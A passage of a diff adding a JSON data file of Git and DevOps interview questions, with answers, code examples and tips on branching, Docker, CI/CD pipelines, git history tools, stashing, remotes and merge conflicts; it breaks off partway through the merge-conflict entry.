@@ -1,0 +1,1352 @@
+[
+  {
+    "id": "git-branching-workflow",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 0,
+    "title": "Git Branching & Workflow",
+    "difficulty": "Beginner",
+    "type": "Concept",
+    "concepts": ["Branching", "Merge vs Rebase", "Git Flow", "Trunk-Based", "Cherry Pick"],
+    "content": {
+      "question": "Explain merge vs rebase. What branching strategy do you prefer and why?",
+      "answer": "Merge creates a merge commit that combines two branches. History shows exactly when branches diverged and merged.\n\nRebase replays commits from one branch onto another. Creates a linear history but rewrites commit hashes.\n\nGolden rule: Never rebase commits that have been pushed and shared with others.\n\nBranching strategies:\n1. Git Flow: main + develop + feature/release/hotfix branches. Good for scheduled releases.\n2. Trunk-Based: Short-lived feature branches merged to main. Good for CI/CD.\n3. GitHub Flow: Simple - main + feature branches with PRs. Good for most teams.",
+      "codeExamples": [
+        {
+          "title": "Merge vs Rebase",
+          "code": "# Merge: preserves history, creates merge commit\ngit checkout main\ngit merge feature/login\n# History:   main ──●──●──●──M──\n#                    \\      /\n#           feature   ●──●──\n\n# Rebase: linear history, rewrites commits\ngit checkout feature/login\ngit rebase main\ngit checkout main\ngit merge feature/login  # fast-forward\n# History:   main ──●──●──●──●──●──\n#                            (feature commits replayed)\n\n# Interactive rebase: clean up before merge\ngit rebase -i main\n# pick abc123 Add login form\n# squash def456 Fix typo in login\n# squash ghi789 Fix another typo\n# Result: 3 commits squashed into 1 clean commit\n\n# GOLDEN RULE:\n# NEVER rebase commits that others have pulled\n# Only rebase YOUR local commits before pushing",
+          "explanation": "Use merge for shared branches (preserves history). Use rebase for local cleanup before pushing (clean, linear history)."
+        },
+        {
+          "title": "Common Git Operations",
+          "code": "# Undo last commit (keep changes)\ngit reset --soft HEAD~1\n\n# Undo last commit (discard changes)\ngit reset --hard HEAD~1\n\n# Undo a specific commit (creates new commit)\ngit revert abc123\n\n# Stash changes temporarily\ngit stash\ngit stash pop  # apply and remove\ngit stash list # see all stashes\n\n# Cherry-pick: apply specific commit to another branch\ngit checkout main\ngit cherry-pick abc123  # apply just that commit\n\n# Find which commit introduced a bug\ngit bisect start\ngit bisect bad          # current commit is bad\ngit bisect good abc123  # this commit was good\n# Git binary-searches between good and bad\n\n# See who changed each line\ngit blame src/app.js\n\n# Search commit messages\ngit log --grep=\"fix login\" --oneline",
+          "explanation": "Know these operations by heart. git reset --soft (undo commit, keep staged), git revert (safe undo for shared branches), git bisect (find bugs)."
+        },
+        {
+          "title": "GitHub Flow Workflow",
+          "code": "# 1. Create feature branch from main\ngit checkout main\ngit pull origin main\ngit checkout -b feature/user-auth\n\n# 2. Make commits (small, focused)\ngit add src/auth/\ngit commit -m \"Add login form component\"\ngit add src/api/\ngit commit -m \"Add auth API endpoints\"\n\n# 3. Push and create PR\ngit push -u origin feature/user-auth\n# Create PR on GitHub\n# Add description, screenshots, test instructions\n\n# 4. Code review\n# Reviewers comment, request changes\n# Push fixes to same branch\ngit add .\ngit commit -m \"Address review feedback\"\ngit push\n\n# 5. Merge PR (squash merge recommended)\n# On GitHub: Squash and merge\n# Deletes feature branch\n\n# 6. Pull latest main\ngit checkout main\ngit pull origin main",
+          "explanation": "GitHub Flow is simple and works for most teams: main is always deployable, feature branches are short-lived, PRs are required for all changes."
+        }
+      ],
+      "notes": [
+        "Commit messages: use imperative mood ('Add feature' not 'Added feature')",
+        "Small, focused commits make code review easier and git bisect useful",
+        "Always pull before starting new work: git checkout main && git pull"
+      ],
+      "followUps": [
+        "What is the difference between git reset and git revert?",
+        "How do you resolve merge conflicts?",
+        "What is a detached HEAD state?"
+      ],
+      "interviewTips": [
+        "Know merge vs rebase trade-offs - this is the most asked Git question",
+        "Mention your team's actual workflow and why it works",
+        "Show you can recover from mistakes: reset, revert, reflog"
+      ]
+    }
+  },
+  {
+    "id": "docker-basics-interview",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 1,
+    "title": "Docker & Containerization",
+    "difficulty": "Intermediate",
+    "type": "Concept",
+    "concepts": ["Docker", "Container", "Image", "Dockerfile", "Docker Compose", "Volume"],
+    "content": {
+      "question": "What is Docker? Explain images, containers, and how you'd containerize a Node.js application.",
+      "answer": "Docker packages applications with their dependencies into containers - lightweight, portable, isolated environments.\n\nKey concepts:\n- Image: Read-only template (like a class). Built from Dockerfile.\n- Container: Running instance of an image (like an object). Isolated process.\n- Dockerfile: Instructions to build an image\n- Volume: Persistent storage (containers are ephemeral)\n- Docker Compose: Run multi-container applications\n\nWhy Docker?\n- 'Works on my machine' → works everywhere\n- Consistent dev/staging/prod environments\n- Easy scaling and deployment\n- Microservices architecture enabler",
+      "codeExamples": [
+        {
+          "title": "Dockerfile for Node.js App",
+          "code": "# Multi-stage build for production\n\n# Stage 1: Build\nFROM node:20-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\n# Stage 2: Production\nFROM node:20-alpine\nWORKDIR /app\nCOPY --from=builder /app/dist ./dist\nCOPY --from=builder /app/node_modules ./node_modules\nCOPY package*.json ./\n\n# Don't run as root\nUSER node\n\nEXPOSE 3000\nCMD [\"node\", \"dist/index.js\"]\n\n# .dockerignore\n# node_modules\n# .git\n# .env\n# dist",
+          "explanation": "Multi-stage builds reduce image size. Stage 1 has all build tools, Stage 2 only has production files. The .dockerignore prevents copying unnecessary files."
+        },
+        {
+          "title": "Docker Compose for Full Stack",
+          "code": "# docker-compose.yml\nversion: '3.8'\nservices:\n  app:\n    build: .\n    ports:\n      - '3000:3000'\n    environment:\n      - DATABASE_URL=postgresql://user:pass@db:5432/mydb\n      - REDIS_URL=redis://cache:6379\n    depends_on:\n      - db\n      - cache\n    volumes:\n      - ./src:/app/src  # hot reload in dev\n\n  db:\n    image: postgres:16-alpine\n    environment:\n      POSTGRES_USER: user\n      POSTGRES_PASSWORD: pass\n      POSTGRES_DB: mydb\n    volumes:\n      - pgdata:/var/lib/postgresql/data\n    ports:\n      - '5432:5432'\n\n  cache:\n    image: redis:7-alpine\n    ports:\n      - '6379:6379'\n\nvolumes:\n  pgdata:  # named volume persists data\n\n# Commands:\n# docker compose up -d      # start all services\n# docker compose logs -f    # stream logs\n# docker compose down       # stop all\n# docker compose down -v    # stop + remove volumes",
+          "explanation": "Docker Compose defines multi-container applications. Each service runs in its own container but can communicate via the internal network."
+        },
+        {
+          "title": "Essential Docker Commands",
+          "code": "# Build and run\ndocker build -t myapp:1.0 .\ndocker run -d -p 3000:3000 --name myapp myapp:1.0\n\n# List and manage\ndocker ps                    # running containers\ndocker ps -a                 # all containers\ndocker images                # local images\ndocker logs myapp            # container logs\ndocker exec -it myapp sh     # shell into container\n\n# Cleanup\ndocker stop myapp            # stop container\ndocker rm myapp              # remove container\ndocker rmi myapp:1.0         # remove image\ndocker system prune -a       # remove everything unused\n\n# Debugging\ndocker inspect myapp         # detailed container info\ndocker stats                 # CPU/memory usage\ndocker logs --tail 50 myapp  # last 50 log lines",
+          "explanation": "These are the most commonly used Docker commands. Know them by heart for interviews and daily work."
+        }
+      ],
+      "notes": [
+        "Alpine images are much smaller (~50MB vs ~900MB for full images)",
+        "Always use .dockerignore to exclude node_modules, .git, .env",
+        "Volumes persist data beyond container lifecycle"
+      ],
+      "followUps": [
+        "What is the difference between CMD and ENTRYPOINT?",
+        "How does Docker networking work?",
+        "What is Kubernetes and when would you need it?"
+      ],
+      "interviewTips": [
+        "Show you've actually used Docker, not just read about it",
+        "Mention multi-stage builds - it shows you care about image size",
+        "Know Docker Compose for local development - it's expected for full-stack roles"
+      ]
+    }
+  },
+  {
+    "id": "cicd-deployment",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 2,
+    "title": "CI/CD & Deployment",
+    "difficulty": "Intermediate",
+    "type": "Experience",
+    "concepts": ["CI/CD", "GitHub Actions", "Testing Pipeline", "Blue-Green Deploy", "Monitoring"],
+    "content": {
+      "question": "What is CI/CD? Describe a deployment pipeline you've worked with or would design.",
+      "answer": "CI (Continuous Integration): Automatically build and test code on every push. Catches bugs early.\n\nCD (Continuous Delivery): Automatically prepare releases for deployment. Human approves.\n\nCD (Continuous Deployment): Automatically deploy to production on every merge. No human step.\n\nA good pipeline: Push → Lint → Test → Build → Deploy to staging → Manual approval → Deploy to production",
+      "codeExamples": [
+        {
+          "title": "GitHub Actions CI Pipeline",
+          "code": "# .github/workflows/ci.yml\nname: CI Pipeline\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    \n    services:\n      postgres:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: test\n        ports:\n          - 5432:5432\n    \n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n          cache: 'npm'\n      \n      - run: npm ci\n      - run: npm run lint\n      - run: npm run typecheck\n      - run: npm test -- --coverage\n      - run: npm run build\n      \n      - uses: actions/upload-artifact@v4\n        with:\n          name: coverage\n          path: coverage/",
+          "explanation": "This pipeline runs on every push and PR: installs deps, lints, type-checks, tests with coverage, and builds. If any step fails, the PR can't be merged."
+        },
+        {
+          "title": "Deployment Strategies",
+          "code": "// 1. Rolling Deployment\n// Replace instances one at a time\n// [v1] [v1] [v1] → [v2] [v1] [v1] → [v2] [v2] [v1] → [v2] [v2] [v2]\n// Pro: zero downtime, gradual rollout\n// Con: mix of versions temporarily\n\n// 2. Blue-Green Deployment\n// Blue (current) ← traffic\n// Green (new)     ← deploy & test here\n// Then switch: Green ← traffic\n// If problems: switch back to Blue instantly\n// Pro: instant rollback\n// Con: needs 2x infrastructure\n\n// 3. Canary Deployment\n// Route 5% of traffic to new version\n// Monitor errors, latency, business metrics\n// If OK: gradually increase to 25% → 50% → 100%\n// If problems: route all traffic back to old version\n// Pro: catches issues with minimal user impact\n// Con: complex routing logic\n\n// 4. Feature Flags (not a deployment strategy, but related)\n// Deploy code but control visibility\nif (featureFlags.isEnabled('new-checkout', user)) {\n  renderNewCheckout();\n} else {\n  renderOldCheckout();\n}",
+          "explanation": "Start with Blue-Green for simplicity and instant rollback. Move to Canary when you need more confidence in gradual rollouts."
+        },
+        {
+          "title": "Monitoring & Observability",
+          "code": "// The 3 pillars of observability:\n\n// 1. LOGGING (what happened)\nconst logger = winston.createLogger({\n  level: 'info',\n  format: winston.format.json(),\n  transports: [new winston.transports.Console()],\n});\nlogger.info('User logged in', { userId: 123, ip: '1.2.3.4' });\nlogger.error('Payment failed', { orderId: 456, error: err.message });\n\n// 2. METRICS (how much / how fast)\n// - Request rate (requests/second)\n// - Error rate (% of 5xx responses)\n// - Latency (p50, p95, p99 response times)\n// - Saturation (CPU, memory, disk usage)\n// Tools: Prometheus, Grafana, Datadog\n\n// 3. TRACING (request flow across services)\n// Track a request through: API Gateway → Auth → DB → Cache → Response\n// Tools: Jaeger, Zipkin, OpenTelemetry\n\n// Health check endpoint\napp.get('/health', async (req, res) => {\n  const dbOk = await checkDatabase();\n  const cacheOk = await checkRedis();\n  const status = dbOk && cacheOk ? 200 : 503;\n  res.status(status).json({ db: dbOk, cache: cacheOk });\n});\n\n// Alerting rules:\n// - Error rate > 1% for 5 minutes → warning\n// - Error rate > 5% for 2 minutes → critical\n// - p99 latency > 2s for 10 minutes → warning\n// - Health check fails → critical",
+          "explanation": "Good monitoring catches issues before users report them. The health endpoint is used by load balancers and Kubernetes to route traffic away from unhealthy instances."
+        }
+      ],
+      "notes": [
+        "CI should run in under 10 minutes - if it's slow, parallelize or cache",
+        "Never deploy on Fridays (or at least have rollback ready)",
+        "Infrastructure as Code (Terraform, Pulumi) makes environments reproducible"
+      ],
+      "followUps": [
+        "How do you handle database migrations in CI/CD?",
+        "What is Infrastructure as Code?",
+        "How do you handle secrets in CI/CD pipelines?"
+      ],
+      "interviewTips": [
+        "Describe a real pipeline you've used or built",
+        "Mention testing in the pipeline: unit → integration → e2e",
+        "Show awareness of rollback strategies - this shows production experience"
+      ]
+    }
+  },
+  {
+    "id": "git-basics",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 3,
+    "title": "Git Basics (init, add, commit)",
+    "difficulty": "Beginner",
+    "type": "Coding",
+    "concepts": ["git init", "git add", "git commit", "Staging Area", "Working Directory"],
+    "content": {
+      "question": "Walk me through the basic Git workflow. What are the three areas in Git, and how do files move between them?",
+      "answer": "Git has three main areas where files exist:\n\n1. Working Directory: Your actual project files on disk. When you edit a file, the change lives here.\n2. Staging Area (Index): A holding zone where you prepare your next commit. You choose exactly which changes to include.\n3. Repository (.git): The permanent history. Once committed, snapshots are stored here.\n\nThe flow is: Edit files (working dir) → git add (staging) → git commit (repository). This three-stage design is powerful because it lets you craft precise commits. You can edit 10 files but only stage and commit 3 of them, keeping your commits focused and reviewable.\n\nUnderstanding this model is foundational. Every Git command moves data between these three areas. git status shows you where everything currently sits.",
+      "codeExamples": [
+        {
+          "title": "Initialize and First Commit",
+          "code": "# Create a new repository\nmkdir my-project && cd my-project\ngit init\n# Initialized empty Git repository in .git/\n\n# Check status - nothing tracked yet\ngit status\n# On branch main\n# No commits yet\n# nothing to commit\n\n# Create files\necho '# My Project' > README.md\necho 'node_modules/' > .gitignore\n\n# Stage specific files\ngit add README.md .gitignore\n\n# Check what's staged\ngit status\n# Changes to be committed:\n#   new file:   .gitignore\n#   new file:   README.md\n\n# Commit with a message\ngit commit -m \"Initial commit: add README and gitignore\"\n# [main (root-commit) a1b2c3d] Initial commit: add README and gitignore\n#  2 files changed, 2 insertions(+)",
+          "explanation": "git init creates the .git directory. git add moves files from working directory to staging. git commit takes a snapshot of everything staged."
+        },
+        {
+          "title": "Selective Staging",
+          "code": "# Edit multiple files\necho 'console.log(\"hello\")' > index.js\necho 'body { margin: 0 }' > styles.css\necho 'Updated docs' >> README.md\n\n# Stage only specific files\ngit add index.js\ngit status\n# Changes to be committed:\n#   new file:   index.js\n# Changes not staged for commit:\n#   modified:   README.md\n# Untracked files:\n#   styles.css\n\n# Stage parts of a file (patch mode)\ngit add -p README.md\n# Shows each hunk, you choose y/n/s(split)\n\n# Unstage a file (keep changes in working dir)\ngit restore --staged index.js\n# Or older syntax: git reset HEAD index.js\n\n# Stage everything (use carefully)\ngit add -A   # stages all changes including deletions\ngit add .    # stages new + modified in current dir",
+          "explanation": "Selective staging is a key skill. git add -p lets you stage individual chunks within a file, enabling very precise commits."
+        },
+        {
+          "title": "Commit Best Practices",
+          "code": "# Good commit messages follow conventions:\n# <type>: <subject>\n# Types: feat, fix, docs, style, refactor, test, chore\n\n# Single-line commit\ngit commit -m \"feat: add user registration endpoint\"\n\n# Multi-line commit (opens editor)\ngit commit\n# In editor:\n# feat: add user registration endpoint\n#\n# - Added POST /api/auth/register route\n# - Password hashing with bcrypt\n# - Email uniqueness validation\n# - Returns JWT token on success\n\n# Amend the last commit (before pushing!)\ngit commit --amend -m \"feat: add user registration with email validation\"\n\n# See commit details\ngit show HEAD\n# Shows the diff of the last commit\n\n# See compact log\ngit log --oneline -5\n# a1b2c3d feat: add user registration endpoint\n# e4f5g6h fix: resolve CORS issue\n# i7j8k9l chore: update dependencies",
+          "explanation": "Good commit messages are imperative ('Add feature' not 'Added feature'). The Conventional Commits format (feat/fix/docs) makes changelogs and versioning automatic."
+        }
+      ],
+      "notes": [
+        "git add -A stages everything including deletions; git add . only stages current directory",
+        "Use .gitignore before your first commit to avoid tracking unwanted files",
+        "git commit --amend rewrites history - only use before pushing"
+      ],
+      "followUps": [
+        "What is the difference between git add . and git add -A?",
+        "How does git commit --amend work internally?",
+        "What happens if you accidentally commit a secret?"
+      ],
+      "interviewTips": [
+        "Explain the three areas clearly - it shows you understand Git's architecture",
+        "Mention git add -p for selective staging - shows attention to clean commits",
+        "Know Conventional Commits format - widely adopted in professional teams"
+      ]
+    }
+  },
+  {
+    "id": "git-log-history",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 4,
+    "title": "Git Log & History",
+    "difficulty": "Beginner",
+    "type": "Coding",
+    "concepts": ["git log", "git show", "git blame", "History Navigation", "Reflog"],
+    "content": {
+      "question": "How do you explore Git history? Explain git log, git show, git blame, and git reflog.",
+      "answer": "Git provides several powerful tools for exploring project history:\n\ngit log: Shows commit history. Has many formatting options like --oneline, --graph, --author, --since, and --grep to filter and display commits in useful ways.\n\ngit show: Displays detailed information about a specific commit including the diff, author, date, and message.\n\ngit blame: Shows who last modified each line of a file and in which commit. Essential for understanding why a line was changed.\n\ngit reflog: Records every movement of HEAD, even operations that rewrite history. It is your safety net - you can recover from almost any mistake using reflog because it tracks commits even after they are unreachable from any branch.",
+      "codeExamples": [
+        {
+          "title": "Git Log Formatting",
+          "code": "# Basic log\ngit log\n\n# Compact one-line format\ngit log --oneline\n# a1b2c3d feat: add auth module\n# e4f5g6h fix: resolve CORS issue\n\n# Visual branch graph\ngit log --oneline --graph --all\n# * a1b2c3d (HEAD -> main) Merge feature/auth\n# |\\  \n# | * e4f5g6h feat: add login endpoint\n# | * i7j8k9l feat: add register endpoint\n# |/  \n# * m0n1o2p chore: initial setup\n\n# Filter by author\ngit log --author=\"John\" --oneline\n\n# Filter by date range\ngit log --since=\"2024-01-01\" --until=\"2024-06-30\" --oneline\n\n# Filter by commit message\ngit log --grep=\"fix\" --oneline\n\n# Show files changed in each commit\ngit log --stat --oneline\n# a1b2c3d feat: add auth module\n#  src/auth/login.ts  | 45 +++++++++++++\n#  src/auth/routes.ts | 12 ++++\n#  2 files changed, 57 insertions(+)\n\n# Custom pretty format\ngit log --pretty=format:\"%h %an %ar - %s\" -10",
+          "explanation": "git log --oneline --graph --all is the most useful form - it shows all branches visually. Add --stat to see which files changed."
+        },
+        {
+          "title": "Git Show and Blame",
+          "code": "# Show details of a specific commit\ngit show a1b2c3d\n# commit a1b2c3d...\n# Author: John <john@example.com>\n# Date:   Mon Jan 15 10:30:00 2024\n#\n#     feat: add auth module\n#\n# diff --git a/src/auth/login.ts b/src/auth/login.ts\n# +export async function login(email, password) {...}\n\n# Show a file at a specific commit\ngit show a1b2c3d:src/auth/login.ts\n\n# Blame: who changed each line\ngit blame src/auth/login.ts\n# a1b2c3d (John 2024-01-15) export async function login(...) {\n# e4f5g6h (Jane 2024-02-01)   const user = await findUser(email);\n# e4f5g6h (Jane 2024-02-01)   if (!user) throw new Error('Not found');\n\n# Blame a specific line range\ngit blame -L 10,20 src/auth/login.ts\n\n# Show what changed between two commits\ngit diff a1b2c3d..e4f5g6h\n\n# Show what changed between branches\ngit diff main..feature/auth",
+          "explanation": "git blame is invaluable for understanding why code was written. Use it with git show to see the full context of a change."
+        },
+        {
+          "title": "Git Reflog - Your Safety Net",
+          "code": "# Reflog records every HEAD movement\ngit reflog\n# a1b2c3d HEAD@{0}: commit: feat: add auth\n# e4f5g6h HEAD@{1}: checkout: moving from feature to main\n# i7j8k9l HEAD@{2}: commit: wip: broken code\n# m0n1o2p HEAD@{3}: reset: moving to HEAD~1\n\n# SCENARIO: You accidentally ran git reset --hard\n# and lost commits. Reflog saves the day:\ngit reflog\n# Find the commit hash BEFORE the reset\ngit reset --hard a1b2c3d  # restore to that point\n\n# SCENARIO: You deleted a branch by mistake\ngit branch -D feature/important\n# Oh no! But reflog has it:\ngit reflog\n# Find the last commit on that branch\ngit checkout -b feature/important a1b2c3d\n\n# Reflog entries expire after 90 days (default)\n# For unreachable commits, 30 days\n\n# Search reflog\ngit reflog --grep-reflog=\"checkout\"",
+          "explanation": "Reflog is Git's undo history. Even after reset --hard or branch deletion, reflog keeps references for 30-90 days. Always check reflog before panicking."
+        }
+      ],
+      "notes": [
+        "git log --all shows commits from ALL branches, not just the current one",
+        "Reflog is local only - it does not sync to remote repositories",
+        "git blame -w ignores whitespace changes for cleaner output"
+      ],
+      "followUps": [
+        "How would you find which commit introduced a specific bug?",
+        "What is the difference between git log and git reflog?",
+        "How do you search for a deleted file in Git history?"
+      ],
+      "interviewTips": [
+        "Mention reflog as a recovery tool - it shows you understand Git deeply",
+        "Know git log --graph for visualizing branch history",
+        "git blame is not about blaming people - it is about understanding context"
+      ]
+    }
+  },
+  {
+    "id": "git-diff-stash",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 5,
+    "title": "Git Diff & Stash",
+    "difficulty": "Beginner",
+    "type": "Coding",
+    "concepts": ["git diff", "git stash", "Working Tree", "Staged Changes", "Patch"],
+    "content": {
+      "question": "How do git diff and git stash work? When would you use each, and what are the different forms of git diff?",
+      "answer": "git diff compares changes between different states in Git. Without arguments, it shows unstaged changes (working directory vs staging area). With --staged (or --cached), it shows what will go into the next commit. You can also diff between branches, commits, or specific files.\n\ngit stash temporarily shelves changes you have made to your working directory so you can work on something else, then come back and re-apply them later. It saves both staged and unstaged changes by default and reverts your working directory to match HEAD.\n\nCommon use case: You are working on a feature, but need to switch to a hotfix branch. Stash your current work, fix the bug, switch back, and pop the stash to continue where you left off. Stashes are stored as a stack (LIFO), and you can have multiple stashes with descriptive names.",
+      "codeExamples": [
+        {
+          "title": "Git Diff Variations",
+          "code": "# Unstaged changes (working dir vs staging area)\ngit diff\n\n# Staged changes (staging area vs last commit)\ngit diff --staged\n# (--cached is a synonym)\ngit diff --cached\n\n# All changes since last commit (working + staged)\ngit diff HEAD\n\n# Diff between two branches\ngit diff main..feature/auth\n\n# Diff between two commits\ngit diff a1b2c3d e4f5g6h\n\n# Diff for a specific file\ngit diff -- src/app.ts\ngit diff main..feature/auth -- src/app.ts\n\n# Only show file names that changed\ngit diff --name-only main..feature/auth\n\n# Show stats (insertions/deletions)\ngit diff --stat main..feature/auth\n#  src/auth.ts  | 45 ++++++++++++++++++\n#  src/app.ts   |  3 ++-\n#  2 files changed, 46 insertions(+), 1 deletion(-)\n\n# Word-level diff (useful for prose)\ngit diff --word-diff",
+          "explanation": "Remember: git diff (unstaged), git diff --staged (staged), git diff HEAD (both). The double-dot notation main..feature means 'changes in feature that are not in main'."
+        },
+        {
+          "title": "Git Stash Operations",
+          "code": "# Stash current changes (staged + unstaged)\ngit stash\n# Saved working directory and index state WIP on main: a1b2c3d ...\n\n# Stash with a descriptive message\ngit stash push -m \"WIP: user authentication form\"\n\n# Stash including untracked files\ngit stash -u\n# Or: git stash --include-untracked\n\n# List all stashes\ngit stash list\n# stash@{0}: On main: WIP: user authentication form\n# stash@{1}: WIP on main: a1b2c3d fix: resolve CORS\n\n# Apply most recent stash (keep it in stash list)\ngit stash apply\n\n# Apply and remove from stash list\ngit stash pop\n\n# Apply a specific stash\ngit stash apply stash@{1}\n\n# Show what is in a stash\ngit stash show -p stash@{0}\n\n# Drop a specific stash\ngit stash drop stash@{1}\n\n# Clear all stashes\ngit stash clear",
+          "explanation": "git stash push -m gives your stash a name so you can identify it later. Use -u to include new untracked files. git stash pop = apply + drop."
+        },
+        {
+          "title": "Creating and Applying Patches",
+          "code": "# Generate a patch file from diff\ngit diff > my-changes.patch\n\n# Generate patch from staged changes\ngit diff --staged > staged-changes.patch\n\n# Generate patch from commits\ngit format-patch -1 HEAD\n# Creates: 0001-feat-add-auth-module.patch\n\n# Generate patches for last 3 commits\ngit format-patch -3 HEAD\n\n# Apply a patch (check first)\ngit apply --check my-changes.patch\ngit apply my-changes.patch\n\n# Apply a formatted patch (preserves commit info)\ngit am 0001-feat-add-auth-module.patch\n\n# Stash only specific files\ngit stash push -m \"auth changes\" src/auth/\n\n# Create a branch from a stash\ngit stash branch new-feature stash@{0}\n# Creates branch, checks it out, applies stash, drops stash",
+          "explanation": "Patches are useful for sharing changes without pushing to a remote. git format-patch preserves commit metadata. git stash branch is great when your stashed changes conflict with current work."
+        }
+      ],
+      "notes": [
+        "git diff shows nothing if all changes are staged - use git diff --staged",
+        "Stashes are local only and do not get pushed to remote",
+        "git stash branch is useful when popping a stash would cause conflicts"
+      ],
+      "followUps": [
+        "What happens if you try to pop a stash that conflicts with current changes?",
+        "How do you diff between the working tree and a specific commit?",
+        "When would you use git format-patch instead of just sharing a branch?"
+      ],
+      "interviewTips": [
+        "Know the three forms of git diff - it shows you understand Git's staging model",
+        "Mention stash -u for including untracked files - a common gotcha",
+        "git stash is essential for context-switching between tasks"
+      ]
+    }
+  },
+  {
+    "id": "git-remote",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 6,
+    "title": "Remote Repositories",
+    "difficulty": "Beginner",
+    "type": "Coding",
+    "concepts": ["git remote", "git push", "git pull", "git fetch", "Upstream Tracking"],
+    "content": {
+      "question": "Explain the difference between git fetch and git pull. How do remote tracking branches work?",
+      "answer": "git fetch downloads new data from the remote repository but does NOT integrate it into your working files. It updates your remote tracking branches (like origin/main) so you can see what others have done without changing your local branch.\n\ngit pull is essentially git fetch + git merge. It fetches from the remote and immediately merges the changes into your current branch. Some teams prefer git pull --rebase which does fetch + rebase instead of fetch + merge, creating a cleaner linear history.\n\nRemote tracking branches (like origin/main) are local references to the state of branches on the remote. They are updated when you fetch or pull. Your local branches can be set to track a remote branch, which lets git push and git pull know where to send and receive changes.\n\nThe key insight: always fetch first to see what is happening on the remote before deciding how to integrate changes. Blindly pulling can lead to unexpected merge conflicts.",
+      "codeExamples": [
+        {
+          "title": "Remote Management",
+          "code": "# Add a remote\ngit remote add origin https://github.com/user/repo.git\n\n# List remotes\ngit remote -v\n# origin  https://github.com/user/repo.git (fetch)\n# origin  https://github.com/user/repo.git (push)\n\n# Add a second remote (e.g., upstream for forks)\ngit remote add upstream https://github.com/original/repo.git\n\n# Rename a remote\ngit remote rename origin github\n\n# Change remote URL (e.g., HTTPS to SSH)\ngit remote set-url origin git@github.com:user/repo.git\n\n# Remove a remote\ngit remote remove upstream\n\n# Show detailed info about a remote\ngit remote show origin\n# Fetch URL: ...\n# Push  URL: ...\n# HEAD branch: main\n# Remote branches:\n#   main    tracked\n#   develop tracked\n# Local branches configured for 'git pull':\n#   main    merges with remote main\n#   develop merges with remote develop",
+          "explanation": "Most repos have one remote (origin). Forks typically add an upstream remote to sync with the original repository."
+        },
+        {
+          "title": "Fetch vs Pull",
+          "code": "# Fetch: download changes, don't merge\ngit fetch origin\n# Updates origin/main, origin/develop, etc.\n# Your local branches are UNCHANGED\n\n# See what changed on remote\ngit log main..origin/main --oneline\n# Shows commits on origin/main that you don't have\n\n# Now decide: merge or rebase\ngit merge origin/main\n# OR\ngit rebase origin/main\n\n# Pull: fetch + merge in one step\ngit pull origin main\n# Equivalent to:\n#   git fetch origin\n#   git merge origin/main\n\n# Pull with rebase (cleaner history)\ngit pull --rebase origin main\n# Equivalent to:\n#   git fetch origin\n#   git rebase origin/main\n\n# Set pull to rebase by default\ngit config --global pull.rebase true\n\n# Fetch all remotes\ngit fetch --all\n\n# Fetch and prune deleted remote branches\ngit fetch --prune",
+          "explanation": "Prefer git fetch + inspect + merge/rebase over blind git pull. Use --prune to clean up remote tracking branches that no longer exist on the server."
+        },
+        {
+          "title": "Push and Upstream Tracking",
+          "code": "# Push and set upstream tracking\ngit push -u origin feature/auth\n# -u sets origin/feature/auth as the tracking branch\n# After this, just 'git push' works\n\n# Push to a different remote branch name\ngit push origin local-branch:remote-branch\n\n# Force push (CAREFUL - rewrites remote history)\ngit push --force-with-lease origin feature/auth\n# --force-with-lease is safer than --force\n# It fails if someone else pushed since your last fetch\n\n# Delete a remote branch\ngit push origin --delete feature/old-branch\n\n# Push all branches\ngit push --all origin\n\n# Push tags\ngit push origin v1.0.0\ngit push --tags  # push all tags\n\n# See tracking relationships\ngit branch -vv\n# * main       a1b2c3d [origin/main] feat: add auth\n#   feature    e4f5g6h [origin/feature] wip: login\n#   local-only i7j8k9l no tracking branch",
+          "explanation": "Always use --force-with-lease instead of --force. It prevents overwriting others' work. git push -u sets up tracking so future push/pull commands know the default remote."
+        }
+      ],
+      "notes": [
+        "git fetch is always safe - it never changes your working directory",
+        "Use --force-with-lease instead of --force to avoid overwriting teammates' work",
+        "git pull --rebase keeps history cleaner than git pull (merge)"
+      ],
+      "followUps": [
+        "What happens when you push to a branch that has diverged?",
+        "How do you sync a forked repository with the upstream?",
+        "What is the difference between --force and --force-with-lease?"
+      ],
+      "interviewTips": [
+        "Always recommend fetch over blind pull - shows awareness of team workflows",
+        "Mention --force-with-lease to show you value team safety",
+        "Explain upstream tracking clearly - it is often misunderstood"
+      ]
+    }
+  },
+  {
+    "id": "git-merge-conflicts",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 7,
+    "title": "Merge Conflicts & Resolution",
+    "difficulty": "Beginner",
+    "type": "Coding",
+    "concepts": ["Merge Conflicts", "Conflict Resolution", "git mergetool", "Three-Way Merge", "Abort"],
+    "content": {
+      "question": "How do merge conflicts happen? Walk me through resolving a conflict step by step.",
+      "answer": "Merge conflicts occur when Git cannot automatically reconcile differences between two branches. This happens when the same lines of the same file were modified differently in each branch. Git does not know which version to keep, so it pauses and asks you to resolve it manually.\n\nCommon conflict scenarios:\n1. Two people edit the same line in the same file\n2. One person edits a file that another person deleted\n3. Both branches add different content at the same location\n\nGit marks conflicts in the file with special markers: <<<<<<< (your changes), ======= (separator), and >>>>>>> (incoming changes). Your job is to edit the file to contain exactly what you want, remove the markers, then stage and commit.\n\nThe best strategy is to prevent conflicts by communicating with your team, keeping branches short-lived, and merging main into your feature branch frequently.",
+      "codeExamples": [
+        {
+          "title": "Resolving a Merge Conflict",
